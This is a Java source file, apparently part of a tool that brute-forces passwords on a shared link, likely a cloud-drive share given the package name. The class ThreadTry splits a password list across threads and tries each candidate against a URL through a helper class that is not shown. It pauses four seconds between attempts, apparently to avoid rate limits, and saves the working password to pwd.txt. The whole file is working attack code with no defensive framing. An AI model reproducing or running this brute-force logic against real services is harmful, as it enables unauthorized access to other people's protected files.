package com.ljheee.pan.someone;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class ThreadTry extends Thread {
    private List<String> password = new ArrayList<String>();
    private String url = "";

    public ThreadTry(String urlString, int start, int end, List<String> pwd) {
        url = urlString;
        for (int index = start; index < end; index++) {
            password.add(pwd.get(index));
        }
    }

    public void run() {
        for (String p : password) {
            boolean flag = new HttpURL(url).execute(p);
            System.out.println(flag + "##密码：" + p + "--" + Thread.currentThread().getName());
            if (flag) {
                System.out.println(flag + "##密码：" + p + "========================");
                write("ok密码：" + p);
                System.exit(0);
            }
            try {
                Thread.sleep(4000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private void write(String str) {
        FileOutputStream out = null;
        try {
            File file = new File("pwd.txt");
            if (!file.exists()) {// 若文件不存在则新建一个
                file.createNewFile();
            }
            out = new FileOutputStream(file, true);// true表示追加打开
            // out = new FileOutputStream(file);// 实例化输入流
            out.write(str.getBytes());// 换行则加\r\n
            out.flush();// 推一下，避免字符留在缓存未写入
            out.close();// 关闭输出流
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }

}